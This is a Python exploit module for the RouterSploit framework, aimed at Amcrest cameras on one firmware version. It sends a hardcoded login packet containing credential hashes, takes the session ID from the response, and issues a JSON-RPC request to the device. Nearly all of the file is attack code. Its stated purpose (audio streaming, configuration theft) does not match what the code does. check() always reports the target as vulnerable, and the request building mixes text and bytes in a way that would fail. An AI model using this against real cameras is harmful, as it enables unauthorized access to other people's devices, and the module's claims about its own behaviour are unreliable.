import argparse
import socket
import struct
import sys
import telnetlib
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    __info__ = {
        "name": "Amcrest Cameras 2.520.AC00.18.R - Unauthenticated Audio Streaming",
        "description": "Amcrest Cameras allow unauthenticated attackers to obtain the "
                       "configuration of the device remotely. A copy of the device configuration "
                       "can be obtained by accessing unprocteted URL. ",
        "authors": (
            "###",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "",
        ),
        "devices": (
            "Amcrest Cameras, firmware version 2.520.AC00.18.R"
        ),
    }



    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success('target seems to be vulnerable')

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print_status("[+] Trying to attempting connection to " + self.target + ":" + str(self.port))
            sock.connect((self.target, self.port))
            print_status("[+] Connected!")

#            login = ("\xa0\x00\x00\x60\x00\x00\x00\x00" + 
#                    "\xc4\xa3\xaf\x48\x99\x56\xb6\xb4" + # username hash
#                    "\x7e\x48\xc4\x86\x90\x98\x54\xf3" + # password hash
#                    "\x05\x02\x00\x01\x00\x00\xa1\xaa")
            login = ( b"\xa0\x00\x00\x60\x00\x00\x00\x00\xc4\xa3\xaf\x48\x99\x56\xb6\xb4\x7e\x48\xc4\x86\x90\x98\x54\xf3\x05\x02\x00\x01\x00\x00\xa1\xaa")
            sock.sendall(login)

            resp = sock.recv(1024)
            print('send...')


            if len(resp) == 32:
                session_id_bin = resp[16:20]

                session_id_int = struct.unpack_from('I', session_id_bin)
                if session_id_int[0] != 0:
                    json = '{"id":1,"method":"magicBox.getSoftwareVersion","params":null,"session":' + str(session_id_int[0]) + '}\n\x00'
                    size = struct.pack("I", len(json))
                    json_request = "\xf6\x00\x00\x00" + size + '\x01\x00\x00\x00\x00\x00\x00\x00' + size + '\x00\x00\x00\x00' + session_id_bin + '\x00\x00\x00\x00' + json
                    sock.sendall(json_request)
                    print(sock.recv(1024))
                else:
                    print_error("Exploit failed - Failed to log in. Response:")

            else:
                print_error('Exploit failed - The correct data seem has not been received')


        else:
            print_error('Exploit failed - target seems to be not vulnerable')
    def check(self):
#       flag = False
#       path = '\xa0\x00\x00\x60\x00\x00\x00\x00\xc4\xa3\xaf\x48\x99\x56\xb6\xb4\x7e\x48\xc4\x86\x90\x98\x54\xf3\x05\x02\x00\x01\x00\x00\xa1\xaa'
#       try:
#           telnetlib.Telnet(self.target, port=self.port, timeout=20)
#       except:
#           print('target is not vulnerable')
#       else:
#       response = self.http_request(
#           method="GET",
#           path=path
   #     )
  #      if response is not None:
 #           print('target is vulnerable')
#            flag = True

        return True
